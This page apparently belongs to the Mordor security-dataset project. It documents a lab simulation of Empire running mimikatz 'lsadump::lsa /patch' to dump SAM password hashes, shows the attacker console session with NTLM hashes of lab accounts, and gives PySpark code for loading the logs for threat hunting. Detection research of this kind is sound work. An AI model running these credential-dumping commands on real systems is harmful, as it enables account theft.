# Empire Mimikatz Lsadump Patch

## Metadata


|                       |    |
|:----------------------|:---|
| id                    | SDWIN-200807103913 |
| author                | Roberto Rodriguez @Cyb3rWard0g |
| creation date         | 2020/08/07 |
| platform              | Windows |
| Tactic(s)             | ['[TA0006](https://attack.mitre.org/tactics/TA0006)'] |
| Technique(s)          | ['[T1003.002](https://attack.mitre.org/techniques/T1003/002)'] |
| Simulaton Environment | Mordor shire |
| Simulation Scripts    | ['https://github.com/OTRF/Blacksmith/blob/master/aws/mordor/cfn-files/scripts/Invoke-Mimikatz.ps1'] |
| Dataset Host           | ['https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/credential_access/host/empire_mimikatz_lsadump_patch.zip'] |
| References        | None |

## Dataset Description
This dataset represents adversaries using PowerSploit's Invoke-Mimikatz function to extract hashes from the Security Account Managers (SAM) database

## Adversary View
```
(Empire: B7Y8G4XC) > usemodule credentials/mimikatz/lsadump*
(Empire: powershell/credentials/mimikatz/lsadump) > info

              Name: Invoke-Mimikatz LSA Dump
            Module: powershell/credentials/mimikatz/lsadump
        NeedsAdmin: True
        OpsecSafe: True
          Language: powershell
MinLanguageVersion: 2
        Background: True
  OutputExtension: None

Authors:
  @JosephBialek
  @gentilkiwi

Description:
  Runs PowerSploit's Invoke-Mimikatz function to extract a
  particular user hash from memory. Useful on domain
  controllers.

Comments:
  http://clymb3r.wordpress.com/ http://blog.gentilkiwi.com htt
  ps://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump#ls
  a

Options:

  Name     Required    Value                     Description
  ----     --------    -------                   -----------
  Agent    True        B7Y8G4XC                  Agent to run module on.                 
  Username False                                 Username to extract the hash for, blank 
                                                for all local passwords.                

(Empire: powershell/credentials/mimikatz/lsadump) > execute
[*] Tasked B7Y8G4XC to run TASK_CMD_JOB
[*] Agent B7Y8G4XC tasked with task ID 2
[*] Tasked agent B7Y8G4XC to run module powershell/credentials/mimikatz/lsadump
(Empire: powershell/credentials/mimikatz/lsadump) > 
Job started: VGHXZ5

Hostname: WORKSTATION5.theshire.local / S-1-5-21-1363495622-3806888128-621328882

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug  4 2020 20:16:54
.## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
## \ / ##       > http://blog.gentilkiwi.com/mimikatz
'## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(powershell) # lsadump::lsa /patch
Domain : WORKSTATION5 / S-1-5-21-1549354820-3669603161-4025758380

RID  : 000001f7 (503)
User : DefaultAccount
LM   : 
NTLM : 

RID  : 000001f5 (501)
User : Guest
LM   : 
NTLM : 

RID  : 000001f4 (500)
User : wardog
LM   : 
NTLM : 42ddb2963bbe8f1c075fc869d3bce33e

RID  : 000001f8 (504)
User : WDAGUtilityAccount
LM   : 
NTLM : 45a313f1860be24e967e55b94649aa31

(Empire: powershell/credentials/mimikatz/lsadump) >
```

## Explore Mordor Dataset

### Initialize Analytics Engine

from openhunt.mordorutils import *
spark = get_spark()

### Download & Process Mordor File

mordor_file = "https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/credential_access/host/empire_mimikatz_lsadump_patch.zip"
registerMordorSQLTable(spark, mordor_file, "mordorTable")

### Get to know your data

df = spark.sql(
    '''
SELECT *
FROM mordorTable
    '''
)
df.printSchema()
        